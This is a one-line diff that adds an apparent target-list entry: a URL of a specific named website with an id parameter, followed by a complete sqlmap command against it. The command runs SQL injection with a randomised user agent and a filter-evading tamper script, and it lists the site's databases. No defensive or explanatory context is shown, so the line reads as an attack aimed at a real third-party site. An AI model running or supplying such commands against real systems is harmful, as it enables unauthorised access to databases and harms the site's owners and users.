@@ -1,0 +1,1 @@
+https://avrdc.org/?id=1 (GET)  # sqlmap.py -u https://avrdc.org/?id=1 --random-agent --tamper=space2comment --drop-set-cookie --batch --dbs
